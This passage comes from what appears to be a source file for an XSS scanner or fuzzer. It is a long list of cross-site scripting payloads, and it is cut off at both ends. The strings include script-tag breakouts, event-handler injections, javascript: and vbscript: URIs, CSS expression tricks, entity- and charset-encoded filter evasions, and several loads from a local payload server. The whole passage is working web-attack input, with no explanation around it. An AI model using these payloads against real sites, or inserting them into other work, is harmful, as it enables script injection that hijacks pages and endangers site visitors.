             '\'><DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
             '?><s?%2b?cript>alert(1)</script>', '?><ScRiPt>alert(1)</script>', '?><<script>alert(1);//<</script>',
             'foo%00<script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '<scr<script>ipt>alert(1)</scr</script>ipt>', '"><scr<script>ipt>alert(1)</scr</script>ipt>',
             "'><scr<script>ipt>alert(1)</scr</script>ipt>",
             '\';alert(String.fromCharCode(75,67,70))//\\\';alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//\\";alert(String.fromCharCode(75,67,70))//--&gt;&lt;/SCRIPT&gt;"&gt;\'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(75,67,70))&lt;/SCRIPT&gt;',
             '\';alert(String.fromCharCode(75,67,70))//\\\';alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//\\";alert(String.fromCharCode(75,67,70))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}',
             '\'\';!--"&lt;X&gt;=&amp;{()}', '&lt;IMG SRC="javascript:alert(1);"&gt;',
             '&lt;IMG SRC=javascript:alert(1)&gt;', '&lt;IMG SRC=JaVaScRiPt:alert(1)&gt;',
             '&lt;IMG SRC=javascript:alert(&amp;quot;X&amp;quot;)&gt;',
             '&lt;IMG SRC=`javascript:alert("Kerala Cyber Force says, \'X\'")`&gt;',
             '&lt;IMG """&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;"&gt;',
             '&lt;IMG SRC=javascript:alert(String.fromCharCode(75,67,70))&gt;',
             '&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;',
             '&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;',
             '&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;',
             '&lt;IMG SRC="jav&#x09;ascript:alert(1);"&gt;', '&lt;IMG SRC="jav&amp;#x09;ascript:alert(1);"&gt;',
             '&lt;IMG SRC="jav&amp;#x0A;ascript:alert(1);"&gt;', '&lt;IMG SRC="jav&amp;#x0D;ascript:alert(1);"&gt;',
             '<IMG SRC=`javascript:alert(1)`>', '"><IMG SRC=`javascript:alert(1)`>',
             "'><IMG SRC=`javascript:alert(1)`>",
             '&lt;IMG&#x0D;SRC&#x0D;=&#x0D;"&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;\'&#x0D;X&#x0D;S&#x0D;S&#x0D;\'&#x0D;)&#x0D;"&#x0D;>&#x0D;',
             '<IMG STYLE="X:expr/*X*/ession(alert(1))">', '"><IMG STYLE="X:expr/*X*/ession(alert(1))">',
             '\'><IMG STYLE="X:expr/*X*/ession(alert(1))">', '<IMG DYNSRC="javascript:alert(1)">',
             '"><IMG DYNSRC="javascript:alert(1)">', '\'><IMG DYNSRC="javascript:alert(1)">',
             '<img dynsrc="javascript:alert(1);">', '"><img dynsrc="javascript:alert(1);">',
             '\'><img dynsrc="javascript:alert(1);">', '<IMG LOWSRC="javascript:alert(1)">',
             '"><IMG LOWSRC="javascript:alert(1)">', '\'><IMG LOWSRC="javascript:alert(1)">',
             '<input type="image" dynsrc="javascript:alert(1);">',
             '"><input type="image" dynsrc="javascript:alert(1);">',
             '\'><input type="image" dynsrc="javascript:alert(1);">',
             '<STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>X',
             '"><STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>X',
             '\'><STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>X',
             '<DIV STYLE="width: expression(alert(1));">', '"><DIV STYLE="width: expression(alert(1));">',
             '\'><DIV STYLE="width: expression(alert(1));">', '<div style="width: expression(alert(1););">',
             '"><div style="width: expression(alert(1););">', '\'><div style="width: expression(alert(1););">',
             "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(1)';</STYLE>",
             '"><STYLE>@im\\port\'\\ja\\vasc\\ript:alert(1)\';</STYLE>',
             "'><STYLE>@im\\port'\\ja\\vasc\\ript:alert(1)';</STYLE>", '<X STYLE="X:expression(alert(1))">',
             '"><X STYLE="X:expression(alert(1))">', '\'><X STYLE="X:expression(alert(1))">',
             'exp/*<A STYLE=\'no\\X:noX("*//*");X:&#101;x&#x2F;*X*//*/*/pression(alert(1))\'>',
             '<STYLE TYPE="text/javascript">alert(1);</STYLE>', '"><STYLE TYPE="text/javascript">alert(1);</STYLE>',
             '\'><STYLE TYPE="text/javascript">alert(1);</STYLE>',
             '<STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>',
             '"><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>',
             '\'><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>', '<A CLASS=X></A>',
             '"><A CLASS=X></A>', "'><A CLASS=X></A>",
             '<STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>',
             '"><STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>',
             '\'><STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>',
             '<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">',
             '"><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">',
             '\'><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">',
             "<? echo('<SCR)';echo('IPT>alert(1)</SCRIPT>'); ?>",
             '"><? echo(\'<SCR)\';echo(\'IPT>alert(1)</SCRIPT>\'); ?>',
             "'><? echo('<SCR)';echo('IPT>alert(1)</SCRIPT>'); ?>",
             '<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">',
             '"><META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">',
             '\'><META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">',
             '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-',
             '"><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-',
             '\'><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-',
             '<XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>',
             '"><XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>',
             '\'><XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>',
             '<SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             '"><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             '\'><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             'a="get";b="URL(\\"";c="javascript:";d="alert(1);\\")";eval(a+b+c+d);',
             '<?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;alert(&quot;X&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>',
             '"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;alert(&quot;X&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>',
             '\'><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;alert(&quot;X&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>',
             '<xml src="javascript:alert(1);">', '"><xml src="javascript:alert(1);">',
             '\'><xml src="javascript:alert(1);">', '<xml id="X"><a><b><script>alert(1);</script>',
             '</ScrIpt><script>alert(1);</script>', '"><script>alert(1);</script>',
             '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script>;</b></a></xml>',
             '<div datafld="b" dataformatas="html" datasrc="#X"></div>',
             '"><div datafld="b" dataformatas="html" datasrc="#X"></div>',
             '\'><div datafld="b" dataformatas="html" datasrc="#X"></div>',
             '<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
             '"><XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
             '\'><XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
             '%253cscript%253ealert(1)%253c/script%253e', 'foo\\?; alert(1);//?;',
             '[b][style="style=width:expre/**/ssion(alert(1))xt]bold[/style][/b]',
             '[b][style="onmouseover="alert(1);]bold[/style][/b]', '</script><script >alert(1)</script>',
             '"></script><script >alert(1)</script>', "'></script><script >alert(1)</script>", '?; alert(1); var foo=?',
             '<img src="" onerror=alert(1)>', '"><img src="" onerror=alert(1)>', '\'><img src="" onerror=alert(1)>',
             '<img src="" onerror=alert(1);>', '"><img src="" onerror=alert(1);>', '\'><img src="" onerror=alert(1);>',
             '><img src="x:x" onerror=alert(1)>', 's%22%20style=x:expression(alert(1))',
             's%22%20style=%22background:url(javascript:alert(?X?))',
             's%22%20%22+STYLE%3D%22background-image%3A+expression%28alert%28%27X%3F%29%29',
             '%22/%3E%3Cmeta%20http-equiv=refresh%20content=0;javascript:alert(1);>',
             '<IMG SRC=" \x0e  javascript:alert(1);">', '"><IMG SRC=" \x0e  javascript:alert(1);">',
             '\'><IMG SRC=" \x0e  javascript:alert(1);">', '&lt;IMG SRC=" &amp;#14;  javascript:alert(1);"&gt;',
             '&lt;SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"&gt;&lt;/SCRIPT&gt;',
             '&lt;SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"&gt;&lt;/SCRIPT&gt;',
             '&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(1)&gt;',
             '&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;', '&lt;IMG SRC="javascript:alert(1)"',
             '&lt;iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html &lt;', '&lt;SCRIPT&gt;a=/X/',
             'alert(a.source)&lt;/SCRIPT&gt;', '&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;',
             '&lt;INPUT TYPE="IMAGE" SRC="javascript:alert(1);"&gt;', '&lt;BODY BACKGROUND="javascript:alert(1)"&gt;',
             '&lt;BODY ONLOAD=alert(1)&gt;', '&lt;IMG LOWSRC="javascript:alert(1)"&gt;',
             '&lt;BGSOUND SRC="javascript:alert(1);"&gt;', '&lt;BR SIZE="&{alert(1)}"&gt;',
             '&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;X&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;X',
             "&lt;IMG SRC='vbscript:msgbox(1)'&gt;", '&lt;IMG SRC="mocha:[code]"&gt;',
             '&lt;IMG SRC="livescript:[code]"&gt;',
             '<img src=\'vbscript:do%63ument.lo%63ation="http://127.0.0.1:3555/xss_serve_payloads/X.html"\'>',
             '"><img src=\'vbscript:do%63ument.lo%63ation="http://127.0.0.1:3555/xss_serve_payloads/X.html"\'>',
             '\'><img src=\'vbscript:do%63ument.lo%63ation="http://127.0.0.1:3555/xss_serve_payloads/X.html"\'>',
             '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);"&gt;',
             '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&gt;',
             '&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);"&gt;',
             '&lt;IFRAME SRC="javascript:alert(1);"&gt;&lt;/IFRAME&gt;',
             '&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert(1);"&gt;&lt;/FRAMESET&gt;',
             '&lt;TABLE BACKGROUND="javascript:alert(1)"&gt;',
             '&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert(1)"&gt;',
             '&lt;DIV STYLE="background-image: url(javascript:alert(1))"&gt;',
             '&lt;DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029"&gt;',
             '&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert(1))"&gt;',
             '&lt;DIV STYLE="width: expression(alert(1));"&gt;',
             "&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(1)';&lt;/STYLE&gt;",
             '&lt;IMG STYLE="X:expr/*X*/ession(alert(1))"&gt;', '&lt;X STYLE="X:expression(alert(1))"&gt;',
             'exp/*&lt;A STYLE=\'no\\X:noX("*//*");', '&lt;STYLE TYPE="text/javascript"&gt;alert(1);&lt;/STYLE&gt;',
             '&lt;STYLE&gt;.X{background-image:url("javascript:alert(1)");}&lt;/STYLE&gt;&lt;A CLASS=X&gt;&lt;/A&gt;',
             '&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert(1)")}&lt;/STYLE&gt;',
             '&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;', '&lt;BASE HREF="javascript:alert(1);//"&gt;',
             '&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://127.0.0.1:3555/xss_serve_payloads/X.html"&gt;&lt;/OBJECT&gt;',
             '&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(1)&gt;&lt;/OBJECT&gt;',
             '&lt;EMBED SRC="data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;',
             'a="get";&#10;b="URL(\\"";&#10;c="javascript:";&#10;d="alert(1);\\")";&#10;eval(a+b+c+d);',
             '&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert(1);"&gt;]]&gt;',
             '&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;',
             '&lt;XML ID=0&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:alert(1)"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;',
             '&lt;SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;',
             '&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;', '&lt;HTML&gt;&lt;BODY&gt;',
             '&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;',
             '&lt;?import namespace="t" implementation="#default#time2"&gt;',
             '&lt;t:set attributeName="innerHTML" to="X&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;X&amp;quot;)&amp;lt;/SCRIPT&amp;gt;"&gt;',
             '&lt;/BODY&gt;&lt;/HTML&gt;', "&lt;? echo('&lt;SCR)';", "echo('IPT&gt;alert(1)&lt;/SCRIPT&gt;'); ?&gt;",
             '&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert(1)&amp;lt;/SCRIPT&amp;gt;"&gt;',
             '&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-',
             '&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;X&lt;/A&gt;',
             '&lt;A HREF="http://1113982867/"&gt;X&lt;/A&gt;',
             '&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;X&lt;/A&gt;',
             '&lt;A HREF="http://0102.0146.0007.00000223/"&gt;X&lt;/A&gt;',
             '&lt;A HREF="h&#x0A;tt&#09;p://6&amp;#9;6.000146.0x7.147/"&gt;X&lt;/A&gt;',
             '&lt;A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html"&gt;X&lt;/A&gt;',
             '&lt;A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html"&gt;X&lt;/A&gt;',
             '&lt;A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./"&gt;X&lt;/A&gt;',
             '&lt;A HREF="javascript:document.location=\'http://127.0.0.1:3555/xss_serve_payloads/X.html\'"&gt;X&lt;/A&gt;',
             '&lt;A HREF="http://www.keralacyberhttp://www.keralacyberforce.in/force.in/"&gt;X&lt;/A&gt;',
             '<form id="test" /><button form="test" formaction="javascript:alert(1)">X',
             '"><form id="test" /><button form="test" formaction="javascript:alert(1)">X',
             '\'><form id="test" /><button form="test" formaction="javascript:alert(1)">X',
             '<input onblur=javascript:alert(1) autofocus><input autofocus>',
             '"><input onblur=javascript:alert(1) autofocus><input autofocus>',
             "'><input onblur=javascript:alert(1) autofocus><input autofocus>",
             '<video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>',
             '"><video poster=javascript:alert(1)//></video>', "'><video poster=javascript:alert(1)//></video>",
             '"><video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>',
             '"><video poster=javascript:alert(1)//></video>', "'><video poster=javascript:alert(1)//></video>",
             "'><video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>",
             '"><video poster=javascript:alert(1)//></video>', "'><video poster=javascript:alert(1)//></video>",
             '<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>',
             '"><head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>',
             '\'><head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>',
             '<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>',
             '"><SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>',
             "'><SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>",
             '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
             '"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
             '\'><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
             '<embed src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></embed>',
             '"><embed src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></embed>',
             '\'><embed src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></embed>',
             '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
             '"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
             '\'><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
             '<b <script>alert(1)//</script>0</script></b>', '"><b <script>alert(1)//</script>0</script></b>',
             "'><b <script>alert(1)//</script>0</script></b>", '<script src="javascript:alert(1)">',
             '"><script src="javascript:alert(1)">', '\'><script src="javascript:alert(1)">',
             '<image src="javascript:alert(1)">', '"><image src="javascript:alert(1)">',
             '\'><image src="javascript:alert(1)">', '<div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             '"><div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             "'><div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>",
             '"><div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             '"><div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             "'><div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>",
             "'><div style=width:1px;filter:glow onfilterchange=alert(1)>x",
             '"><div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             "'><div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>", '<? foo="><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>">',
             '<! foo="><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>">', '</ foo="><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>">',
             '<? foo="><x foo=\'?><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>\'>">',
             '<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>">', '<% foo><x foo="%><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>">',
             '<iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>',
             '"><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>',
             "'><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>",
             '<iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html></iframe>',
             '"><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html></iframe>',
             "'><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html></iframe>",
             '<div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
             '"><div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
             '\'><div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
             '<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">', '"><img[a][b]src=x[d]onerror[c]=[e]"alert(1)">',
             '\'><img[a][b]src=x[d]onerror[c]=[e]"alert(1)">', '<a href="[a]java[b]script[c]:alert(1)">XXX</a>',
             '"><a href="[a]java[b]script[c]:alert(1)">XXX</a>', '\'><a href="[a]java[b]script[c]:alert(1)">XXX</a>',
             '<img src="x` `<script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>"` `>', '<img src onerror /" \'"= alt=alert(1)//">',
             '"><img src onerror /" \'"= alt=alert(1)//">', '\'><img src onerror /" \'"= alt=alert(1)//">',
             '<title onpropertychange=alert(1)></title><title title=></title>',
             '"><title onpropertychange=alert(1)></title><title title=></title>',
             "'><title onpropertychange=alert(1)></title><title title=></title>",
             '<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">',
             '"><a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">',
             '\'><a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">',
             '<!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//">',
             '"><!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//">',
             '\'><!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//">',
             '<?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">',
             '"><?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">',
             '\'><?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">', '<!--[if]><script>alert(1)</script -->',
             '"><!--[if]><script>alert(1)</script -->', "'><!--[if]><script>alert(1)</script -->",
             '<!--[if<img src=x onerror=alert(2)//]> -->', '"><!--[if<img src=x onerror=alert(2)//]> -->',
             "'><!--[if<img src=x onerror=alert(2)//]> -->", '<!-- `<img/src=xx:xx onerror=alert(1)//--!>',
             '"><!-- `<img/src=xx:xx onerror=alert(1)//--!>', "'><!-- `<img/src=xx:xx onerror=alert(1)//--!>",
             "<xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>",
             '"><xmp> <% </xmp> <img alt=\'%></xmp><img src=xx:x onerror=alert(1)//\'>  <script> x=\'<%\' </script> %>/ alert(2) </script>  XXX <style> *[\'<!--\']{} </style> -->{} *{color:red}</style>',
             "'><xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>",
             '<frameset onload=alert(1)>', '"><frameset onload=alert(1)>', "'><frameset onload=alert(1)>",
             '<table background="javascript:alert(1)"></table>', '"><table background="javascript:alert(1)"></table>',
             '\'><table background="javascript:alert(1)"></table>', '<!--<img src="--><img src=x onerror=alert(1)//">',
             '"><!--<img src="--><img src=x onerror=alert(1)//">',
             '\'><!--<img src="--><img src=x onerror=alert(1)//">',
             '<comment><img src="</comment><img src=x onerror=alert(1))//">',
             '"><comment><img src="</comment><img src=x onerror=alert(1))//">',
             '\'><comment><img src="</comment><img src=x onerror=alert(1))//">',
             '<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>',
             '"><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>',
             '\'><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>',
             '<style><img src="</style><img src=x onerror=alert(1)//">',
             '"><style><img src="</style><img src=x onerror=alert(1)//">',
             '\'><style><img src="</style><img src=x onerror=alert(1)//">',
             '<li style=list-style:url() onerror=alert(1)></li>', '"><li style=list-style:url() onerror=alert(1)></li>',
             "'><li style=list-style:url() onerror=alert(1)></li>",
             '<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             '"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             "'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>",
             '"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             '"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             "'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>",
             "'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>",
             '"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             "'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>",
             '<a style="-o-link:\'javascript:alert(1)\';-o-link-source:current">X</a>',
             '"><a style="-o-link:\'javascript:alert(1)\';-o-link-source:current">X</a>',
